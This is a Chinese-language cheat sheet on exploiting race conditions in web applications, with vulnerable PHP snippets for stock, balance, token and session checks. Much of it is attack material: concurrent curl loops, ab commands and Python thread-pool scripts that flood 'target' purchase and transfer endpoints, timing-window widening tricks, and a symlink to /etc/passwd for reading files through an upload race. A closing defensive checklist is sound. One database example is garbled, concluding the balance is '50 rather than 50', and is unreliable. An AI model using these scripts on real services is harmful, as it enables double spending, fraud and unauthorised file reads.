# 竞争条件绕过秘笈

## 检查-使用(TOCTOU)竞争

### 文件操作竞争
```php
// 时间点A：检查文件
if (file_exists('user_file.txt')) {
    // 时间点B：在此处另一个进程可能删除或修改文件
    $content = file_get_contents('user_file.txt');  // 可能失败或获取不同内容
}
```

### 权限检查竞争
```php
// 时间点A：检查用户是否有权
if (user_has_permission($userId, $action)) {
    // 时间点B：权限可能被改变
    perform_action($userId, $action);  // 无权限的用户执行了操作
}
```

## 金额和库存竞争

### 超卖库存
```php
// 时间点A：检查库存
if ($stock > 0) {
    // 时间点B：另一个请求也通过了检查
    $stock--;
    // 结果：库存为-1（超卖）
}
```

### 金额提取竞争
```php
// 时间点A：检查余额
if ($balance >= $amount) {
    // 时间点B：另一个取款并发执行
    $balance -= $amount;
    // 结果：余额为负数
}
```

## 令牌和验证码重用

### 一次性令牌重复使用
```php
// 时间点A：获取令牌
$token = get_valid_token();  // 返回token_123

// 时间点B：令牌验证前，可多次使用
if (verify_token($token)) {  // 仅检查存在性
    perform_payment($token);  // 实际支付
}

// 攻击：并发发送相同token两次
```

### 验证码重复触发
```php
// 缺少令牌消费机制
if (verify_code($code)) {  // 检查有效
    reset_password($user);  // 但未删除使用过的code
}

// 攻击：多个请求用同一code同时发送
```

## 锁竞争和临界区

### 缺少互斥锁
```php
// 无锁的关键操作
function transfer_money($from, $to, $amount) {
    $from_balance = get_balance($from);
    // 关键区开始
    // 另一个线程可能同时执行此函数
    if ($from_balance >= $amount) {
        deduct($from, $amount);
        add($to, $amount);
    }
    // 关键区结束
}
```

### 锁粒度不足
```php
// 锁整个账户表
lock('accounts');

// 但可能多个账户同时更新
// 或锁粒度太粗，导致性能问题
```

## 并发登录和会话

### 多设备同时登录
```php
// 缺少会话互斥检查
if (verify_password($user, $password)) {
    $sessionId = generate_session();
    $_SESSION[$sessionId] = $user;
    // 没有检查该用户是否已在其他地方登录
}

// 攻击：多个请求同时登录，创建多个会话
```

### 会话固定和会话劫持
```php
// 同时有多个会话ID有效
// 攻击者可利用并发请求在受害者和攻击者之间切换
```

## 状态同步竞争

### 缺少原子性操作
```php
// 非原子操作
$state = read_from_db($id);  // 状态A
modify_state($state);         // 修改为状态B
write_to_db($id, $state);    // 写回

// 期间另一个请求也读到状态A，两个修改被合并成一个
```

## 缓存失效竞争

### 缓存和数据库不同步
```php
// 缓存检查失败时的竞争
if (!cache_exists($key)) {
    // 多个请求同时执行此区块
    $data = expensive_query();
    cache_set($key, $data);
}

// 结果：多个相同的昂贵查询被执行（缓存穿透）
```

## 实际利用技巧

### 时间窗口扩大
```php
// 原始漏洞：时间窗口很小
if ($stock > 0) {
    $stock--;
}

// 利用技巧：通过添加耗时操作扩大时间窗口
POST /buy?item=1&delay=5  // 应用在操作前sleep(5)

// 或通过大数据传输阻塞处理时间
POST /buy
data=<大文件,使处理延迟>
```

### 特殊参数导致延迟
```php
// 某些框架特定参数会触发重操作
?id=1%00  # 空字节可能触发额外处理
?id=1<>1  # 不同框架处理差异
?id[]=1   # 数组参数处理延迟
```

### 快速序列请求
```bash
# 使用curl循环快速发送
for i in {1..1000}; do
    curl -X POST http://target/vulnerable \
         -d "token=test&amount=100" &
done
wait

# 使用ab进行并发
ab -c 100 -n 1000 -p payload.txt http://target/buy

# 使用Python线程池
import concurrent.futures
import requests

def exploit():
    requests.post('http://target/buy', data={'token': 'x'})

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as e:
    [e.submit(exploit) for _ in range(10000)]
```

### 利用异步处理的竞争
```php
// 异步队列处理
if ($balance >= $amount) {
    queue_job('deduct', $userId, $amount);  // 异步处理
    return 'success';
}

// 时间窗口：返回success和实际处理之间
// 多个请求返回success后，才开始扣款
// 导致一个账户被扣款多次

// 利用：快速发送多个请求，都会得到success
```

### 数据库事务的竞争
```php
// 使用READ UNCOMMITTED隔离级别
// 一个事务可能读到未提交的数据

// 竞争条件：
// 事务1：SELECT balance（读到100）
// 事务2：UPDATE balance (设为0)
// 事务1：UPDATE balance (减50，变成50) - 基于之前的值
// 事务2提交失败
// 结果：余额是50而非50

// 利用：理解数据库隔离级别的差异
```

### 文件系统竞争
```bash
# TOCTOU in 文件上传
# 1. 上传文件检查（安全）
# 2. 文件处理（不安全）
# 中间可能有删除/修改

# 利用：
# 上传恶意文件
# 在检查和执行之间替换为不同文件
# 使用符号链接：ln -s /etc/passwd upload/file.txt
# 通过TOCTOU窗口读取任意文件
```

### 应用逻辑竞争
```php
// 两个API端点不同步
GET /api/balance  // 返回100
POST /api/transfer?amount=150  // 基于balance的值检查

// 竞争：
// 请求1：GET /balance (返回100)
// 请求2：POST /transfer (余额变为0)
// 请求1：POST /transfer (检查通过，扣款150，余额为-50)

// 利用：先读取余额，快速转账前将其转走
```

## 快速定位和利用

**关键词识别**：
- 检查后立即操作（无锁/事务）
- 库存、金额、计数器操作
- 一次性令牌验证后使用
- 多步骤操作无原子性

**竞争条件检测工具**：
```bash
# 使用ab、wrk等并发工具
ab -c 100 -n 1000 http://target/vulnerable

# 或Python并发
import concurrent.futures
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    [executor.submit(request, url) for _ in range(1000)]
```

**利用工具和技巧**：
- ApacheBench (ab)：快速并发请求
- wrk：高性能HTTP基准测试
- Python concurrent.futures：自定义并发脚本
- Burp Intruder：并发payload发送
- 符号链接攻击：TOCTOU文件竞争

**测试优先级**：
1. 库存/金额操作（最明显，影响最大）
2. 令牌和验证码（一次性检查）
3. 一次性操作（支付、注册等）
4. 权限检查（并发权限修改）
5. 缓存同步（穿透和失效）
6. 异步操作（返回-执行分离）
7. 数据库事务（隔离级别利用）
8. 文件操作（符号链接、TOCTOU）
9. 应用逻辑（多API端点不同步）
10. 会话和登录（并发登录、会话固定）

## 防御检查清单

- ✓ 关键操作使用数据库事务
- ✓ 使用悲观锁（SELECT FOR UPDATE）或乐观锁（版本号）
- ✓ 原子操作（CAS、原子指令）
- ✓ 一次性令牌验证后立即删除
- ✓ 操作后增加版本号或时间戳
- ✓ 使用互斥锁保护关键区域
- ✓ 数据库级别的约束（外键、唯一性）
- ✓ 定期审计日志查找异常并发操作
- ✓ 测试并发场景的正确性
